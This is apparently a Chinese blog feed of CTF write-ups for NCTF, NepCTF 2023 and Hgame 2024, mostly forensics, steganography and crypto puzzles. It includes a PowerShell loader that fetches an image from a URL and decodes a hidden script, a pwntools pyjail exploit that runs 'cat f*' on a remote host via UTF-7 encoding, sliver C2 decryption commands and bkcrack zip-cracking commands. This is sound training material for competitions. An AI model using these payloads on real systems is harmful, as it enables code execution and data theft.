<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开本地 PNG 图像文件</span></span><br><span class="line">image_path = <span class="string">&quot;nctf.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理像素信息</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2440</span>):</span><br><span class="line">        pixel = img.getpixel((x, y))</span><br><span class="line">        value = (pixel[<span class="number">2</span>] &amp; <span class="number">15</span>) * <span class="number">16</span> | (pixel[<span class="number">1</span>] &amp; <span class="number">15</span>)</span><br><span class="line">        result += <span class="built_in">chr</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果字符串</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>后来也知道一些基本的powershell，只需要将IEX改为echo即可</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((aNet.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[]</span><br><span class="line"><span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125;</span><br><span class="line">&#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
<p>运行成功后得到以下这段</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOMpReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
<p>看起来明显不对劲，字符很奇怪，很明显进行了混淆，实际比赛也是卡在了这里</p>
<p>查询了一下<code>&amp;((GV '*mdR*').NaMe[3,11,2]-JoIN'') </code></p>
<p>这是一种powershell反混淆技术，<a href="https://www.securonix.com/blog/hiding-the-powershell-execution-flow/">Securonix 威胁研究知识共享系列：隐藏 PowerShell 执行流 - Securonix</a></p>
<p>实际上约等于IEX</p>
<p>因此还是需要修改成echo输出</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOM</span></span><br><span class="line"><span class="type">pReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
<p>以此类推</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="string">&#x27;自行填充&#x27;</span>.sPLIt( <span class="string">&#x27;&lt;r_l:&#123;&amp;Z&#x27;</span> ) | %&#123; ([<span class="type">cOnVErt</span>]::toInt16( ([<span class="built_in">strING</span>]<span class="variable">$_</span> ) , <span class="number">16</span> )<span class="operator">-aS</span>[<span class="built_in">cHAr</span>])&#125; ) <span class="operator">-JOIN</span> <span class="string">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> (([<span class="type">rUNtiME.INTERoPsERvIceS.MaRshal</span>]::PTRtOstrinGBsTr([<span class="type">runtIme.INTeRopSeRviCES.mARShAl</span>]::seCUResTrInGTObsTR(<span class="variable">$</span>(<span class="string">&#x27;自行填充&#x27;</span> | <span class="built_in">conVeRtto-SEcurEsTrIng</span> <span class="literal">-key</span> (<span class="number">143</span>..<span class="number">112</span>))) ) ) ) <span class="operator">-JOIN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终得到原始脚本，获得flag</p>
<h3 id="NCTF2077-slivery">NCTF2077: slivery</h3>
<p><strong>考点：</strong></p>
<p>首先在镜像文件中我们可以直接提取出一个flag.zip</p>
<p>sliver-c2流量解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_pcap_parser.py --pcap dump.pcapng --filter http --domain_name 192.168.207.128</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_decrypt.py --transport http --file_path ./http-sessions.json --force minidump.dmp</span><br></pre></td></tr></table></figure>
<p>P@33w000000rd_U_GOT解压压缩包</p>
<h3 id="ezjail">ezjail</h3>
<p><strong>考点：pyjail，UTF-7字符集利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from base64 import b64encode</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"># s = process([&quot;python3&quot;,&quot;server.py&quot;])</span><br><span class="line">s = remote(&quot;node4.anna.nssctf.cn&quot;,28506)</span><br><span class="line">s.sendline(&quot;e&quot;)</span><br><span class="line">s.recvuntil(&quot; &gt; &quot;)</span><br><span class="line">#ls_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span><br><span class="line">cat_flag_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat f*&#x27;)&quot;</span><br><span class="line">#s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(ls_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(cat_flag_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>暂无环境，所以本题关注原理</p>
<p>本题最开始显示的是⽩名单限制了特殊字符只有 +=#\r\n</p>
<p>当时实际做的时候挺接近了，也想到了这一点，但是没有考虑到换行的问题</p>
<h3 id="randommaker">randommaker</h3>
<p><strong>考点：测信道</strong></p>
<p>暂保留，不懂测信道</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NepNep-Writeup</title>
    <url>/2023/09/29/2023NepNep-Writeup/</url>
    <content><![CDATA[<h1>2023NepNep-Writeup</h1>
<h2 id="Web">Web</h2>
<h3 id="ez-java-checkin">ez_java_checkin</h3>
<p><strong>考点：shiro反序列化</strong></p>
<p>提示管理员登陆，admin默认</p>
<p><img src="https://s2.loli.net/2023/09/29/eTOApcdyrMXtwzR.png" alt=""></p>
<p>发现rememberMe=deleteMe，查询找到相关漏洞</p>
<p>工具一把梭</p>
<p><img src="https://s2.loli.net/2023/09/29/zTWpvLM6VZRPdxO.png" alt=""></p>
<p>注入内存马</p>
<p><img src="https://s2.loli.net/2023/09/29/VIqdTD8banlQ3uX.png" alt=""></p>
<p>连接webshell</p>
<p><img src="https://s2.loli.net/2023/09/29/w2NgWBtjGOxZAHU.png" alt=""></p>
<p>开始寻找flag，在start.sh中找到</p>
<p><img src="https://s2.loli.net/2023/09/29/s4phrUitKWZTBvN.png" alt=""></p>
<h2 id="Misc">Misc</h2>
<h3 id="CheckIn">CheckIn</h3>
<p><strong>考点：签到</strong></p>
<p><img src="https://s2.loli.net/2023/09/29/TWKFvQROpV9ySxu.png" alt=""></p>
<h3 id="与AI共舞的哈夫曼">与AI共舞的哈夫曼</h3>
<p><strong>考点：哈夫曼算法</strong></p>
<p>给的是一段压缩算法，根据提示交给chtgpt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import heapq</span><br><span class="line"></span><br><span class="line">class HuffmanNode:</span><br><span class="line">    def __init__(self, char, freq):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = None</span><br><span class="line">        self.right = None</span><br><span class="line"></span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line">def build_huffman_tree(frequencies):</span><br><span class="line">    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    while len(heap) &gt; 1:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(None, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    return heap[0]</span><br><span class="line"></span><br><span class="line">def decompress(input_file, output_file):</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    num_symbols = data[0]</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    offset = 1</span><br><span class="line"></span><br><span class="line">    for i in range(num_symbols):</span><br><span class="line">        byte = data[offset]</span><br><span class="line">        freq = (data[offset + 1] &lt;&lt; 24) | (data[offset + 2] &lt;&lt; 16) | (data[offset + 3] &lt;&lt; 8) | data[offset + 4]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        offset += 5</span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    decoded_data = &#x27;&#x27;</span><br><span class="line">    current_node = root</span><br><span class="line"></span><br><span class="line">    for byte in data[offset:]:</span><br><span class="line">        bits = bin(byte)[2:].rjust(8, &#x27;0&#x27;)</span><br><span class="line">        for bit in bits:</span><br><span class="line">            if bit == &#x27;0&#x27;:</span><br><span class="line">                current_node = current_node.left</span><br><span class="line">            else:</span><br><span class="line">                current_node = current_node.right</span><br><span class="line"></span><br><span class="line">            if current_node.char is not None:</span><br><span class="line">                decoded_data += chr(current_node.char)</span><br><span class="line">                current_node = root</span><br><span class="line"></span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">        f.write(decoded_data)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    compressed_file = &#x27;compressed.bin&#x27;</span><br><span class="line">    decompressed_file = &#x27;decompressed.txt&#x27;</span><br><span class="line"></span><br><span class="line">    # 解压缩文件</span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/09/29/o5xBwTz7MJUCFi2.png" alt=""></p>
<h3 id="小叮弹钢琴">小叮弹钢琴</h3>
<p><strong>考点：xor</strong></p>
<p>首先给的一段音频，用Au打开，发现包含两个内容，一个明显是十六制数字，另外一个怀疑是摩斯密码，手写下来解码得到一段明文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YOUSHOULDUSETHISTOXORSOMETHING</span><br></pre></td></tr></table></figure>
<p>根据提示，考虑异或解密，手搓了一段脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher_text_hex = &quot;0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&quot;</span><br><span class="line">cipher_text_bytes = bytes.fromhex(cipher_text_hex[2:])</span><br><span class="line">key = &quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;</span><br><span class="line">key_bytes = key.encode()</span><br><span class="line">plain_text_bytes = bytearray(len(cipher_text_bytes))</span><br><span class="line"></span><br><span class="line">for i in range(len(cipher_text_bytes)):</span><br><span class="line">    plain_text_bytes[i] = cipher_text_bytes[i] ^ key_bytes[i % len(key_bytes)]</span><br><span class="line"></span><br><span class="line">decrypted_text = plain_text_bytes.decode()</span><br><span class="line"></span><br><span class="line">print(&quot;Decrypted Text:&quot;, decrypted_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是解下来出现了nep字样，但是字符不对劲</p>
<p><img src="https://s2.loli.net/2023/09/29/FoR42QkXEf7JsSh.png" alt=""></p>
<p>然后用CyberChef一把梭，得到了结果</p>
<p><img src="https://s2.loli.net/2023/09/29/DpPRqJvEW8SImNB.png" alt=""></p>
<p>应该是脚本存在问题，但是代码能力有限，真想不出来了，等赛后wp吧</p>
<h3 id="codes">codes</h3>
<p><strong>考点：C++ 绕过</strong></p>
<p>根据提示，flag在环境变量中</p>
<p>根据查找，有一下几种方法</p>
<ol>
<li>
<p><strong>使用 <code>extern char **environ</code> 全局变量：</strong></p>
<p>这是一种直接的方法，使用全局变量 <code>environ</code>，它是一个指向指针的指针，用于存储环境变量的字符串数组。遍历这个数组并打印环境变量的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>使用 <code>getenv()</code> 函数：</strong></p>
<p><code>getenv()</code> 函数允许你通过指定环境变量名称来获取其值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* env_var_name = <span class="string">&quot;PATH&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* env_var_value = getenv(env_var_name);</span><br><span class="line">    <span class="keyword">if</span> (env_var_value != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s=%s\n&quot;</span>, env_var_name, env_var_value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Environment variable &#x27;%s&#x27; not found.\n&quot;</span>, env_var_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>使用 <code>main()</code> 函数的参数 <code>char *argv[]</code>：</strong></p>
<p>程序的启动参数中也包含了环境变量信息。这种方法需要一些额外的解析工作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (envp[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>逐个尝试，全部失败了</p>
<p>开始尝试各种绕过姿势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern char **en\</span><br><span class="line">viron;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    while (en\</span><br><span class="line">viron[i] != NULL) &#123;</span><br><span class="line">        printf(&quot;%s\n&quot;, en\</span><br><span class="line">viron[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nepctf&#123;easy_codes_3a5786c2-dd96-46bd-9909-23f894dc8d2a_[TEAM_HASH]&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ConnectedFive">ConnectedFive</h3>
<p><strong>考点：象棋</strong></p>
<p><img src="https://s2.loli.net/2023/09/29/DIuOpeSJkYsTxWf.png" alt=""></p>
<p>万宁，果真折磨</p>
<h3 id="陌生的语言">陌生的语言</h3>
<p><strong>考点：龙语文字，月亮魔法文字</strong></p>
<p>没啥好说的，上图，比较好奇出题人到底是怎么找到的这个图</p>
<p><img src="https://s2.loli.net/2023/09/29/ifCgDS2O9Jzdw1y.jpg" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/29/wofOdTlQaR38XpE.png" alt=""></p>
<p>然后将对应一下，最终成功提交上去的flag为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure>
<h3 id="你也喜欢三月七么">你也喜欢三月七么</h3>
<p><strong>考点：AES，星穹铁道文字解密</strong></p>
<p>拿到手刚开始以为这个题是密码的，当然，也确实有部分是，但主要可能是考察阅读理解。我还想再说一句，星穹铁道，启动！</p>
<p>首先先来看一下附件给了我们什么内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure>
<p>第一个是salt的长度，第二个是key的长度，第三个是偏移量iv，第四个就是相对应的密文了</p>
<p>其次，来分析一下题目给的提示</p>
<p><u><strong>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</strong></u></p>
<p><u><strong>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</strong></u></p>
<p>第一次阅读的时候我的关注点就是再256和群名两个关键上，256是指向hash算法，群名自然是跟附件中没有给出的key（PS：题目中关键的英文也是key）有关。</p>
<p>但是我刚开始完全没有注意到一个长度的问题，也就是salt_lenth= 10 和key_lenth= 16，而是将NepCTF 2023直接哈希计算了，中间留了空格（PS：因为我看群名也是留了空格的），甚至因为存在salt这个量还在考虑是否算法还进行了变种，然后尝试aes解密失败了。后来又从题目里的关键提示，也就是三月七闻群名好咸，咸指的自然就是盐，而盐的英文是salt。意识到这一点，也就开始知道为什么给出了两个长度值了salt的长度是提示使用NepCTF2023（PS:不加空格，刚好十个字），然后开始计算哈希256，得到的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</span><br></pre></td></tr></table></figure>
<p>但是长度是32个字节，所以需要截取出一半作为key，具体代码实现如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">*#* *提供的信息</span><br><span class="line">*key_hex = &quot;dd8e671df3882c5be6423cd030bd7cb6&quot;</span><br><span class="line">iv_hex = &quot;88219bdee9c396eca3c637c0ea436058&quot;</span><br><span class="line">ciphertext_hex = &quot;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&quot;</span><br><span class="line"></span><br><span class="line">*#* *将十六进制的**key**、**iv**和**ciphertext**转换为字节串</span><br><span class="line">*key = binascii.unhexlify(key_hex)</span><br><span class="line">iv = binascii.unhexlify(iv_hex)</span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line">*#* *创建**AES**解密器对象</span><br><span class="line">*cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">*#* *解密数据</span><br><span class="line">*decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">*#* *将解密后的字节数据转换为字符串</span><br><span class="line">*decrypted_string = decrypted_data.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">*#* *打印解密后的字符串</span><br><span class="line">*print(decrypted_string)</span><br></pre></td></tr></table></figure>
<p>最终计算下来结果为一串十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d</span><br></pre></td></tr></table></figure>
<p>然后转字符，转base64得到网址</p>
<p><strong><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></strong></p>
<p>下载下来一张图片</p>
<p><img src="https://s2.loli.net/2023/09/29/8eWuRQc2y3htlYi.png" alt=""></p>
<p>然后第一反应识图，结果google继陌生的语言后又失效喽（悲</p>
<p>后来又想到题目一开始就有了提示，星穹铁道，然后搜索相关的文字，找到了贝洛伯格特殊文字</p>
<p><img src="https://s2.loli.net/2023/09/29/biMX7Bx8CuJwScr.jpg" alt=""></p>
<p>然后跟表对照得到最终的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;HRP_aIways_likes_March_7th&#125;</span><br></pre></td></tr></table></figure>
<p>(PS:做图文题做到够，麻了)</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NepNep</tag>
      </tags>
  </entry>
  <entry>
    <title>2024Hgame-Writeup-Misc</title>
    <url>/2024/02/28/2024Hgame-Writeup-Misc/</url>
    <content><![CDATA[<h1>2024Hgame-Writeup-Misc</h1>
<h2 id="前言">前言</h2>
<p>中途去做其他的了，只做了部分题，这边只给个misc的部分题解</p>
<h2 id="Misc">Misc</h2>
<h3 id="try-another-way-to-see">try_another_way_to_see</h3>
<p><strong>考点：倾斜图片生成</strong></p>
<p>对png图片进行一个宽高修改，就可以看出flag了</p>
<p><img src="https://s2.loli.net/2024/02/28/hN1WR8fpi4goSTI.png" alt="2024Hgame_1"></p>
<h3 id="希儿希儿希尔">希儿希儿希尔</h3>
<p><strong>考点：LSB隐写、希尔密码、图片修复</strong></p>
<p>依然是先修复</p>
<p><img src="https://s2.loli.net/2024/02/28/qWIpSDiP5zxrHwY.png" alt="2024Hgame_2"></p>
<p>分离出一个压缩包，得到一段密文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVOCRJGMKLDJGBQIUIVXHEYLPNWR</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/28/k857GEHMD6iwLqK.png" alt="2024Hgame_3"></p>
<p>图片的LSB里藏着密钥</p>
<p>希尔密码解密即得flag</p>
<h3 id="来自星尘的问候">来自星尘的问候</h3>
<p><strong>考点：steghide弱密码、图片密码</strong></p>
<p>首先steghide的弱密码爆破，得到一个压缩包</p>
<p>剩余都在图片之中，这种题目就emmm</p>
<p>出一次被骂一次😀</p>
<p><img src="https://s2.loli.net/2024/02/28/CriyEwZSTegjtqv.png" alt="2024Hgame_4"></p>
<h3 id="simple-attack">simple_attack</h3>
<p><strong>考点：明文攻击</strong></p>
<p>这道题有一个坑点就是明文攻击会需要根据出题者使用的压缩软件不同，就是你出题使用的压缩软件，必须和做题对明文进行压缩的软件相同，不仅仅从压缩算法来看，具体原因未知</p>
<p>本题最终测试出来使用的是bandzip</p>
<p>先提取出key，然后使用的是修改压缩包原密码的方式进行提取的文件</p>
<p>当时实际做的时候直接提取photo文件失败，才采取的上述方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C attachment.zip -c 103223779_p0.jpg -P 103223779_p0.zip -p 103223779_p0.jpg</span><br><span class="line">bkcrack.exe -C attachment.zip -k e423add9 375dcd1c 1bce583e -U flag.zip easy</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/28/Ht291v8dMkpcRml.png" alt="2024Hgame_5"></p>
<p>最后在base64转图片即可</p>
<p><img src="https://s2.loli.net/2024/02/28/Rzqt3GYFhnrg7kC.png" alt="2024Hgame_6"></p>
<h3 id="ek1ng-want-girlfriend">ek1ng_want_girlfriend</h3>
<p><strong>考点：文件提取</strong></p>
<p>流量里直接提取图片，flag在右下角</p>
<p><img src="https://s2.loli.net/2024/02/28/lwY7irV4zLckM9I.png" alt="2024Hgame_7"></p>
<p>没有女朋友+1，呜呜呜呜~~~~~</p>
<h3 id="ezWord">ezWord</h3>
<p><strong>考点：word隐写，盲水印，spam message，rot8000</strong></p>
<p>docx的本质是一个压缩文件，因此打开该文件，发现存在以下文件</p>
<p><img src="https://s2.loli.net/2024/02/28/dvx8chnJrYi9NPX.png" alt="2024Hgame_8"></p>
<p>盲水印得到密钥，解开压缩包</p>
<p><img src="https://s2.loli.net/2024/02/28/BirjTEcKl23CMsn.png" alt="2024Hgame_9"></p>
<p>压缩包有一段文本，是一种解密</p>
<p><a href="https://www.spammimic.com/decode.cgi">spammimic - decoded</a></p>
<p><img src="https://s2.loli.net/2024/02/28/c8xTOYNUVejrZdn.png" alt="2024Hgame_10"></p>
<p>这里卡了一会儿，本来以为是某种编码格式中突出的，最后发现原来是rot8000<img src="https://s2.loli.net/2024/02/28/fwAH9Tg3P42vRbh.png" alt="2024Hgame_11"></p>
<h3 id="龙之舞">龙之舞</h3>
<p><strong>考点：频谱隐写，deepsound，二维码修复</strong></p>
<p>给了一段音频，然后打开查看在频谱图中发现了一段密钥</p>
<p><img src="https://s2.loli.net/2024/02/28/ArbpHdq9IWfj2LJ.png" alt="2024Hgame_12"></p>
<p>但是明显经过了翻转处理，读起来不太对劲</p>
<p>最后得到的密钥为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5H8w1nlWCX3hQLG</span><br></pre></td></tr></table></figure>
<p>然后deepsound解密，并且提取出文件，一个Gif</p>
<p>我们通过分帧处理发现部分图片上存在二维码，因此将其拼接起来</p>
<p>最终进行二维码的修复即得flag</p>
<p><img src="https://s2.loli.net/2024/02/28/tZ1GXaDH6chuMgY.png" alt="2024Hgame_13"></p>
<h3 id="与ai聊天">与ai聊天</h3>
<p><img src="https://s2.loli.net/2024/02/28/7T2krtCFqy6aDz5.png" alt="2024Hgame_14"></p>
<h3 id="简单的vmdk取证">简单的vmdk取证</h3>
<p>要求找到windows上的密码，格式为hgame{nthash_password}</p>
<p><img src="https://s2.loli.net/2024/02/28/15YEtdsAmWajUqy.png" alt="2024Hgame_15"></p>
<p><img src="https://s2.loli.net/2024/02/28/IvcN7jUBfbZXx5E.png" alt="2024Hgame_16"></p>
<h3 id="简单的取证-不过前十个有红包">简单的取证,不过前十个有红包</h3>
<p>取证大师直接提出来了，但是我原本以为这两题是分开的，没想到是一块儿的</p>
<p><img src="https://s2.loli.net/2024/02/28/BwMRS9z5GkEON3F.png" alt="2024Hgame_17"></p>
